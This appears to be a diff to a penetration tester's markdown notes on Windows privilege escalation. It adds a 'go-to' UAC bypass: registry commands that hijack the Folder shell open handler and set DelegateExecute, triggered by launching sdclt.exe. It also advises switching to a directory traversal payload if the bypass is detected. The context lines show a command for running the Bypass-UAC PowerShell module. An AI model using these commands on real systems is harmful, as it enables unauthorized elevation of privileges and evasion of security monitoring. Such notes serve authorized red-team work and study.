@@ -348,6 +348,12 @@ LPVOID lpReserved ) // Reserved
 - The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of bypasses per Windows version number
 - The [Bypass UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) powershell script can automate this
 	- `Import-Module .\Bypass-UAC.ps1` and then `Bypass-UAC -Method UacMethodSysprep`
+- [This Blog](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies) goes into bypass techniques, of which fodhelper and elevated COM in `cmsptlua` are pretty reliable
+- Go-to bypass:
+  - `reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c notepad.exe" /f`
+    - If this gets detected, use a directory traversal payload
+  - `reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /f`
+  - Then trigger with `%windir%\System32\sdclt.exe`
 
 **Bypassing GPO restrictions** 
 - Often, GPO restrictions will be in place where users can't access perform certain actions
